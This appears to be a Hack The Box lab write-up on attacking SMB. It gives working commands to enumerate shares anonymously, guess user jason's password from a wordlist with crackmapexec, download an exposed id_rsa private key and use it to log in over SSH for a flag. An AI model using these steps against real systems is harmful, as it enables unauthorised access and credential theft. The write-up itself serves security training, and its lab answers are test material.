---
tags:
  - htb
  - linux
  - "#smb"
draft: false
date: 2026-04-28
title: attacking-smb
---
### Q1: What is the name of the shared folder with READ permissions?
we can find the shared folders using this command:

```
smbclient -N -L //$ipAddress$
```
and to verify access we can use this command:
```
smbmap -H $ipAddress$
```

### Q2: What is the password for the username "jason"?

using `smbmap -H $ipAddress$ -r GGJ` we got id_rsa but it is not possible to get this file
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	./GGJ
	dr--r--r--                0 Tue Apr 19 17:33:55 2022	.
	dr--r--r--                0 Mon Apr 18 13:08:30 2022	..
	fr--r--r--             3381 Tue Apr 19 17:33:03 2022	id_rsa
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
[*] Closed 1 connections                                                                                            

using resources page we can find pws.list. Let's use it to crack `jason's` password:

```
crackmapexec smb $ipAddress$ -u jason -p pws.list --local-auth
```

### Q3: Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

first we need to login to smb share to get id_rsa file after obtaining jason's password:

```
smbclient --user jason //$ipAddress$
```

now we can download `id_rsa`:
```
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (97.1 KiloBytes/sec) (average 97.1 KiloBytes/sec)
smb: \> 
```

don't forget to add permissions to the file:

```
chmod 700 id_rsa
```

```
ssh -i id_rsa jason@$ipAddress$
```

now we can get our jason's flag:

```
cat flag.txt
```
